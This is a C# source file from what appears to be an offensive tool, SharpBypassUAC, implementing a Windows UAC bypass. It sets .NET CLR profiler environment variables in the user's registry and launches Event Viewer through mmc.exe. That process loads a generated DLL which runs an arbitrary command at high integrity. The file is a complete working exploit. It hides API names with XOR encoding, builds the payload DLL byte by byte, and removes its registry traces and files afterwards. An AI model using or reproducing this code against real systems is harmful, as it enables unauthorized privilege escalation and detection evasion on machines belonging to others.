using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

namespace SharpBypassUAC
{
    /// <summary>
    /// UACME #39: .NET CLR Profiler DLL hijack bypass.
    ///
    /// The CLR checks COR_ENABLE_PROFILING / COR_PROFILER / COR_PROFILER_PATH
    /// environment variables at process startup.  When set in HKCU\Environment
    /// and propagated with WM_SETTINGCHANGE, any elevated .NET-hosted process
    /// (e.g. mmc.exe eventvwr.msc) loads the attacker DLL as a COM profiler.
    ///
    /// Flow:
    ///   1. Generate a random CLSID and build a payload DLL
    ///   2. Write DLL to %TEMP%\{random}.dll
    ///   3. Set HKCU\Environment: COR_ENABLE_PROFILING=1, COR_PROFILER={guid},
    ///      COR_PROFILER_PATH=<dll path>
    ///   4. Broadcast WM_SETTINGCHANGE so new processes pick up the vars
    ///   5. Launch "mmc.exe eventvwr.msc" — the Event Viewer snap-in is .NET,
    ///      CLR loads our profiler DLL at high integrity
    ///   6. Cleanup: delete registry values, delete DLL
    ///
    /// Unfixed: Windows 7 through Windows 11.
    /// </summary>
    public class DotNetProfiler
    {
        // XOR keys per DLL
        private static readonly byte _xkAdv = 0x5A;   // advapi32
        private static readonly byte _xkK32 = 0x2D;   // kernel32
        private static readonly byte _xkU32 = 0x61;    // user32
        private static readonly byte _xkOle = 0x3C;    // ole32

        // --- advapi32.dll (key 0x5A) ---
        // "advapi32.dll"
        private static readonly byte[] _sAdv = new byte[] { 0x3B, 0x3E, 0x2C, 0x3B, 0x28, 0x39, 0x08, 0x0C, 0x12, 0x3E, 0x36, 0x36 };
        // "RegOpenKeyExW"
        private static readonly byte[] _s0 = new byte[] { 0x08, 0x3F, 0x3D, 0x3A, 0x28, 0x3F, 0x31, 0x12, 0x3F, 0x2B, 0x1F, 0x28, 0x0D };
        // "RegSetValueExW"
        private static readonly byte[] _s1 = new byte[] { 0x08, 0x3F, 0x3D, 0x09, 0x3F, 0x2E, 0x0C, 0x3B, 0x36, 0x2F, 0x3F, 0x1F, 0x28, 0x0D };
        // "RegDeleteValueW"
        private static readonly byte[] _s2 = new byte[] { 0x08, 0x3F, 0x3D, 0x1E, 0x3F, 0x36, 0x3F, 0x2E, 0x3F, 0x0C, 0x3B, 0x36, 0x2F, 0x3F, 0x0D };
        // "RegCloseKey"
        private static readonly byte[] _s3 = new byte[] { 0x08, 0x3F, 0x3D, 0x19, 0x36, 0x35, 0x29, 0x3F, 0x12, 0x3F, 0x2B };

        // --- kernel32.dll (key 0x2D) ---
        // "kernel32.dll"
        private static readonly byte[] _sK32 = new byte[] { 0x46, 0x48, 0x5F, 0x41, 0x48, 0x43, 0x1F, 0x1D, 0x19, 0x49, 0x43, 0x43 };
        // "DeleteFileW"
        private static readonly byte[] _s4 = new byte[] { 0x69, 0x48, 0x43, 0x48, 0x5D, 0x48, 0x63, 0x44, 0x43, 0x48, 0x78 };
        // "GetTempPathW"
        private static readonly byte[] _s5 = new byte[] { 0x6A, 0x48, 0x5D, 0x79, 0x48, 0x40, 0x5B, 0x7B, 0x44, 0x5D, 0x4F, 0x78 };
        // "WriteFile"
        private static readonly byte[] _s6 = new byte[] { 0x7A, 0x5F, 0x44, 0x5D, 0x48, 0x63, 0x44, 0x43, 0x48 };
        // "CreateFileW"
        private static readonly byte[] _s7 = new byte[] { 0x6E, 0x5F, 0x48, 0x44, 0x5D, 0x48, 0x63, 0x44, 0x43, 0x48, 0x78 };
        // "CloseHandle"
        private static readonly byte[] _s8 = new byte[] { 0x6E, 0x43, 0x42, 0x5C, 0x48, 0x6D, 0x44, 0x41, 0x49, 0x43, 0x48 };
        // "CreateProcessW"
        private static readonly byte[] _s9 = new byte[] { 0x6E, 0x5F, 0x48, 0x44, 0x5D, 0x48, 0x7D, 0x5F, 0x42, 0x46, 0x48, 0x5C, 0x5C, 0x78 };
        // "WaitForSingleObject"
        private static readonly byte[] _s10 = new byte[] { 0x7A, 0x44, 0x44, 0x5D, 0x63, 0x42, 0x5F, 0x7E, 0x44, 0x41, 0x40, 0x43, 0x48, 0x62, 0x45, 0x45, 0x48, 0x46, 0x5D };

        // --- user32.dll (key 0x61) ---
        // "user32.dll"
        private static readonly byte[] _sU32 = new byte[] { 0x14, 0x12, 0x04, 0x13, 0x52, 0x51, 0x45, 0x05, 0x0D, 0x0D };
        // "SendMessageTimeoutW"
        private static readonly byte[] _s11 = new byte[] { 0x32, 0x04, 0x0F, 0x05, 0x2C, 0x04, 0x12, 0x12, 0x00, 0x06, 0x04, 0x35, 0x08, 0x0E, 0x04, 0x0E, 0x14, 0x15, 0x36 };

        // --- ole32.dll (key 0x3C) ---
        // "ole32.dll"
        private static readonly byte[] _sOle = new byte[] { 0x53, 0x50, 0x59, 0x0F, 0x0E, 0x12, 0x58, 0x50, 0x50 };
        // "CoCreateGuid"
        private static readonly byte[] _s12 = new byte[] { 0x7F, 0x53, 0x7F, 0x48, 0x59, 0x5F, 0x48, 0x59, 0x7B, 0x49, 0x5D, 0x58 };
        // "StringFromCLSID"
        private static readonly byte[] _s13 = new byte[] { 0x6F, 0x48, 0x48, 0x5D, 0x5C, 0x5B, 0x7A, 0x48, 0x53, 0x51, 0x7F, 0x70, 0x6F, 0x71, 0x78 };

        // Delegates
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate int RegOpenKeyExWDelegate(IntPtr hKey, string lpSubKey, uint ulOptions, uint samDesired, out IntPtr phkResult);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate int RegSetValueExWDelegate(IntPtr hKey, string lpValueName, uint Reserved, uint dwType, byte[] lpData, uint cbData);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate int RegDeleteValueWDelegate(IntPtr hKey, string lpValueName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int RegCloseKeyDelegate(IntPtr hKey);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate bool DeleteFileWDelegate(string lpFileName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate uint GetTempPathWDelegate(uint nBufferLength, StringBuilder lpBuffer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool WriteFileDelegate(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate IntPtr CreateFileWDelegate(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool CloseHandleDelegate(IntPtr hObject);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate bool CreateProcessWDelegate(
            string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory,
            byte[] lpStartupInfo, byte[] lpProcessInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint WaitForSingleObjectDelegate(IntPtr hHandle, uint dwMilliseconds);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate IntPtr SendMessageTimeoutWDelegate(
            IntPtr hWnd, uint Msg, IntPtr wParam, string lParam,
            uint fuFlags, uint uTimeout, out IntPtr lpdwResult);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int CoCreateGuidDelegate(byte[] pguid);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int StringFromCLSIDDelegate(byte[] rclsid, out IntPtr lplpsz);

        // Constants
        private static readonly IntPtr HKCU = new IntPtr(unchecked((int)0x80000001));
        private const uint KEY_SET_VALUE = 0x0002;
        private const uint REG_SZ = 1;
        private const uint GENERIC_WRITE = 0x40000000;
        private const uint CREATE_ALWAYS = 2;
        private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
        private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        private const uint CREATE_NO_WINDOW = 0x08000000;
        private static readonly IntPtr HWND_BROADCAST = new IntPtr(0xFFFF);
        private const uint WM_SETTINGCHANGE = 0x001A;
        private const uint SMTO_ABORTIFHUNG = 0x0002;

        public DotNetProfiler(byte[] encodedCommand)
        {
            AlwaysNotify alwaysnotify = new AlwaysNotify();

            string command = Encoding.UTF8.GetString(encodedCommand);
            Console.WriteLine("[*] .NET Profiler DLL hijack bypass (UACME #39)");

            // Resolve APIs
            var regOpenKeyExW = W.G<RegOpenKeyExWDelegate>(W.X(_sAdv, _xkAdv), W.X(_s0, _xkAdv));
            var regSetValueExW = W.G<RegSetValueExWDelegate>(W.X(_sAdv, _xkAdv), W.X(_s1, _xkAdv));
            var regDeleteValueW = W.G<RegDeleteValueWDelegate>(W.X(_sAdv, _xkAdv), W.X(_s2, _xkAdv));
            var regCloseKey = W.G<RegCloseKeyDelegate>(W.X(_sAdv, _xkAdv), W.X(_s3, _xkAdv));
            var deleteFileW = W.G<DeleteFileWDelegate>(W.X(_sK32, _xkK32), W.X(_s4, _xkK32));
            var getTempPathW = W.G<GetTempPathWDelegate>(W.X(_sK32, _xkK32), W.X(_s5, _xkK32));
            var writeFile = W.G<WriteFileDelegate>(W.X(_sK32, _xkK32), W.X(_s6, _xkK32));
            var createFileW = W.G<CreateFileWDelegate>(W.X(_sK32, _xkK32), W.X(_s7, _xkK32));
            var closeHandle = W.G<CloseHandleDelegate>(W.X(_sK32, _xkK32), W.X(_s8, _xkK32));
            var createProcessW = W.G<CreateProcessWDelegate>(W.X(_sK32, _xkK32), W.X(_s9, _xkK32));
            var waitForSingleObject = W.G<WaitForSingleObjectDelegate>(W.X(_sK32, _xkK32), W.X(_s10, _xkK32));
            var sendMessageTimeoutW = W.G<SendMessageTimeoutWDelegate>(W.X(_sU32, _xkU32), W.X(_s11, _xkU32));
            var coCreateGuid = W.G<CoCreateGuidDelegate>(W.X(_sOle, _xkOle), W.X(_s12, _xkOle));
            var stringFromCLSID = W.G<StringFromCLSIDDelegate>(W.X(_sOle, _xkOle), W.X(_s13, _xkOle));

            // Step 1: Generate random CLSID
            byte[] guidBytes = new byte[16];
            int hr = coCreateGuid(guidBytes);
            if (hr != 0)
            {
                Console.WriteLine("[!] CoCreateGuid failed: 0x" + hr.ToString("X8"));
                return;
            }

            IntPtr guidStrPtr;
            hr = stringFromCLSID(guidBytes, out guidStrPtr);
            if (hr != 0)
            {
                Console.WriteLine("[!] StringFromCLSID failed: 0x" + hr.ToString("X8"));
                return;
            }

            string guidStr = Marshal.PtrToStringUni(guidStrPtr);
            Marshal.FreeCoTaskMem(guidStrPtr);

            Console.WriteLine("[+] Generated profiler CLSID: " + guidStr);

            // Step 2: Build payload DLL and write to %TEMP%
            StringBuilder tempPath = new StringBuilder(260);
            getTempPathW(260, tempPath);
            string dllPath = tempPath.ToString() + guidStr.Replace("{", "").Replace("}", "").Replace("-", "").Substring(0, 8) + ".dll";

            byte[] payloadDll = BuildPayloadDll(command);
            IntPtr hFile = createFileW(dllPath, GENERIC_WRITE, 0, IntPtr.Zero, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
            if (hFile == INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[!] Failed to create payload DLL: " + dllPath);
                return;
            }

            uint written;
            writeFile(hFile, payloadDll, (uint)payloadDll.Length, out written, IntPtr.Zero);
            closeHandle(hFile);
            Console.WriteLine("[+] Payload DLL written: " + dllPath);

            // Step 3: Set environment variables in HKCU\Environment
            IntPtr hKey;
            int lResult = regOpenKeyExW(HKCU, "Environment", 0, KEY_SET_VALUE, out hKey);
            if (lResult != 0)
            {
                Console.WriteLine("[!] RegOpenKeyExW failed: " + lResult);
                deleteFileW(dllPath);
                return;
            }

            byte[] val1 = Encoding.Unicode.GetBytes("1\0");
            regSetValueExW(hKey, "COR_ENABLE_PROFILING", 0, REG_SZ, val1, (uint)val1.Length);

            byte[] val2 = Encoding.Unicode.GetBytes(guidStr + "\0");
            regSetValueExW(hKey, "COR_PROFILER", 0, REG_SZ, val2, (uint)val2.Length);

            byte[] val3 = Encoding.Unicode.GetBytes(dllPath + "\0");
            regSetValueExW(hKey, "COR_PROFILER_PATH", 0, REG_SZ, val3, (uint)val3.Length);

            regCloseKey(hKey);
            Console.WriteLine("[+] COR_PROFILER environment variables set in HKCU\\Environment");

            // Step 4: Broadcast WM_SETTINGCHANGE
            IntPtr sendResult;
            sendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, IntPtr.Zero, "Environment",
                SMTO_ABORTIFHUNG, 5000, out sendResult);
            Console.WriteLine("[+] WM_SETTINGCHANGE broadcast sent");

            // Step 5: Launch mmc.exe eventvwr.msc (triggers CLR profiler load)
            try
            {
                string mmcPath = "C:\\Windows\\System32\\mmc.exe";
                string mmcArgs = "C:\\Windows\\System32\\mmc.exe eventvwr.msc";

                // STARTUPINFOW: 104 bytes on x64
                byte[] si = new byte[104];
                BitConverter.GetBytes(104).CopyTo(si, 0); // cb
                // PROCESS_INFORMATION: 24 bytes on x64
                byte[] pi = new byte[24];

                bool success = createProcessW(mmcPath, mmcArgs, IntPtr.Zero, IntPtr.Zero,
                    false, CREATE_NO_WINDOW, IntPtr.Zero, null, si, pi);

                if (success)
                {
                    Console.WriteLine("[+] mmc.exe eventvwr.msc launched — CLR will load profiler DLL");

                    // Wait for MMC to load and trigger profiler
                    IntPtr hProcess = IntPtrFromBytes(pi, 0);
                    waitForSingleObject(hProcess, 10000);
                    closeHandle(hProcess);
                    IntPtr hThread = IntPtrFromBytes(pi, IntPtr.Size);
                    closeHandle(hThread);

                    Console.WriteLine("[+] Elevated command executed via .NET Profiler chain");
                }
                else
                {
                    Console.WriteLine("[!] CreateProcessW for mmc.exe failed");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Launch failed: " + ex.Message);
            }

            // Step 6: Cleanup — remove env vars and DLL
            System.Threading.Thread.Sleep(3000);

            lResult = regOpenKeyExW(HKCU, "Environment", 0, KEY_SET_VALUE, out hKey);
            if (lResult == 0)
            {
                regDeleteValueW(hKey, "COR_ENABLE_PROFILING");
                regDeleteValueW(hKey, "COR_PROFILER");
                regDeleteValueW(hKey, "COR_PROFILER_PATH");
                regCloseKey(hKey);
                Console.WriteLine("[+] Registry cleanup: COR_PROFILER values removed");
            }

            // Broadcast again to propagate cleanup
            sendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, IntPtr.Zero, "Environment",
                SMTO_ABORTIFHUNG, 5000, out sendResult);

            // Try to delete DLL (may be locked)
            for (int i = 0; i < 5; i++)
            {
                if (deleteFileW(dllPath))
                {
                    Console.WriteLine("[+] Payload DLL deleted");
                    break;
                }
                System.Threading.Thread.Sleep(1000);
            }
        }

        private static IntPtr IntPtrFromBytes(byte[] data, int offset)
        {
            if (IntPtr.Size == 8)
                return new IntPtr(BitConverter.ToInt64(data, offset));
            return new IntPtr(BitConverter.ToInt32(data, offset));
        }

        /// <summary>
        /// Build minimal x64 PE DLL that calls CreateProcessA in DllMain.
        /// Identical to IntelShaderCache.BuildPayloadDll — duplicated here to keep
        /// each bypass file self-contained and avoid cross-class coupling.
        /// </summary>
        private static byte[] BuildPayloadDll(string command)
        {
            byte[] commandBytes = Encoding.ASCII.GetBytes(command + "\0");

            using (MemoryStream ms = new MemoryStream())
            using (BinaryWriter bw = new BinaryWriter(ms))
            {
                // DOS Header (64 bytes)
                bw.Write((ushort)0x5A4D);
                bw.Write(new byte[58]);
                bw.Write((uint)0x40);

                // PE Signature
                bw.Write((uint)0x00004550);

                // COFF Header (20 bytes)
                bw.Write((ushort)0x8664);        // AMD64
                bw.Write((ushort)1);             // 1 section
                bw.Write((uint)0);
                bw.Write((uint)0);
                bw.Write((uint)0);
                bw.Write((ushort)0xF0);          // SizeOfOptionalHeader
                bw.Write((ushort)0x2022);        // DLL

                // Optional Header PE32+ (240 bytes)
                bw.Write((ushort)0x020B);
                bw.Write((byte)0); bw.Write((byte)0);
                bw.Write((uint)0x200);
                bw.Write((uint)0); bw.Write((uint)0);
                bw.Write((uint)0x1000);          // EntryPoint
                bw.Write((uint)0x1000);          // BaseOfCode
                bw.Write((ulong)0x180000000);    // ImageBase
                bw.Write((uint)0x1000);          // SectionAlignment
                bw.Write((uint)0x200);           // FileAlignment
                bw.Write((ushort)6); bw.Write((ushort)0);
                bw.Write((ushort)0); bw.Write((ushort)0);
                bw.Write((ushort)6); bw.Write((ushort)0);
                bw.Write((uint)0);
                bw.Write((uint)0x3000);          // SizeOfImage
                bw.Write((uint)0x200);           // SizeOfHeaders
                bw.Write((uint)0);
                bw.Write((ushort)3);             // CONSOLE
                bw.Write((ushort)0x8160);        // DllCharacteristics
                bw.Write((ulong)0x100000);
                bw.Write((ulong)0x1000);
                bw.Write((ulong)0x100000);
                bw.Write((ulong)0x1000);
                bw.Write((uint)0);
                bw.Write((uint)16);

                // Data Directories
                bw.Write((ulong)0);              // Export
                bw.Write((uint)0x1080);          // Import RVA
                bw.Write((uint)0x28);            // Import Size
                for (int i = 2; i < 12; i++) bw.Write((ulong)0);
                bw.Write((uint)0x10B8);          // IAT RVA
                bw.Write((uint)0x10);            // IAT Size
                bw.Write((ulong)0); bw.Write((ulong)0); bw.Write((ulong)0);

                // Section Header .text
                bw.Write(Encoding.ASCII.GetBytes(".text\0\0\0"));
                int textVirtualSize = 0xC8 + commandBytes.Length + 32;
                bw.Write((uint)textVirtualSize);
                bw.Write((uint)0x1000);
                int textRawSize = ((textVirtualSize + 0x1FF) / 0x200) * 0x200;
                bw.Write((uint)textRawSize);
                bw.Write((uint)0x200);
                bw.Write((uint)0); bw.Write((uint)0);
                bw.Write((ushort)0); bw.Write((ushort)0);
                bw.Write((uint)0xE0000060);

                // Pad to 0x200
                long pos = ms.Position;
                int pad = 0x200 - (int)pos;
                if (pad > 0) bw.Write(new byte[pad]);

                // DllMain machine code (108 bytes)
                byte[] code = new byte[]
                {
                    0x48, 0x81, 0xEC, 0xB8, 0x00, 0x00, 0x00,
                    0x83, 0xFA, 0x01,
                    0x75, 0x53,
                    0x31, 0xC0,
                    0x4C, 0x8D, 0x54, 0x24, 0x50,
                    0xB9, 0x0C, 0x00, 0x00, 0x00,
                    0x49, 0x89, 0x02,
                    0x49, 0x83, 0xC2, 0x08,
                    0xFF, 0xC9,
                    0x75, 0xF5,
                    0xC7, 0x44, 0x24, 0x50, 0x44, 0x00, 0x00, 0x00,
                    0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x08,
                    0x48, 0x8D, 0x44, 0x24, 0x50,
                    0x48, 0x89, 0x44, 0x24, 0x40,
                    0x48, 0x8D, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00,
                    0x48, 0x89, 0x44, 0x24, 0x48,
                    0x31, 0xC9,
                    0x48, 0x8D, 0x15, 0x75, 0x00, 0x00, 0x00,
                    0x45, 0x31, 0xC0,
                    0x45, 0x31, 0xC9,
                    0xFF, 0x15, 0x59, 0x00, 0x00, 0x00,
                    0xB8, 0x01, 0x00, 0x00, 0x00,
                    0x48, 0x81, 0xC4, 0xB8, 0x00, 0x00, 0x00,
                    0xC3
                };

                bw.Write(code);
                int padImport = 0x80 - code.Length;
                bw.Write(new byte[padImport]);

                // Import Directory (2 entries × 20 bytes)
                bw.Write((uint)0x10A8); bw.Write((uint)0); bw.Write((uint)0);
                bw.Write((uint)0); // Name RVA placeholder
                bw.Write((uint)0x10B8);
                bw.Write(new byte[20]);

                // ILT
                bw.Write((ulong)0); bw.Write((ulong)0);

                // IAT
                bw.Write((ulong)0); bw.Write((ulong)0);

                // Command string
                bw.Write(commandBytes);

                // DLL name + Hint/Name
                long sectionStart = 0x200;
                long dllNameOff = ms.Position;
                uint dllNameRva = (uint)(0x1000 + (dllNameOff - sectionStart));
                bw.Write(Encoding.ASCII.GetBytes("kernel32.dll\0"));

                long hintNameOff = ms.Position;
                uint hintNameRva = (uint)(0x1000 + (hintNameOff - sectionStart));
                bw.Write((ushort)0);
                bw.Write(Encoding.ASCII.GetBytes("CreateProcessA\0"));

                // Fix up RVAs
                long savedPos = ms.Position;
                ms.Position = sectionStart + 0x80 + 12;
                bw.Write(dllNameRva);
                ms.Position = sectionStart + 0xA8;
                bw.Write((ulong)hintNameRva);
                ms.Position = sectionStart + 0xB8;
                bw.Write((ulong)hintNameRva);
                ms.Position = savedPos;

                // Pad to alignment
                long totalSection = ms.Position - sectionStart;
                int padAlign = (int)(((totalSection + 0x1FF) / 0x200) * 0x200 - totalSection);
                if (padAlign > 0) bw.Write(new byte[padAlign]);

                bw.Flush();
                return ms.ToArray();
            }
        }
    }
}
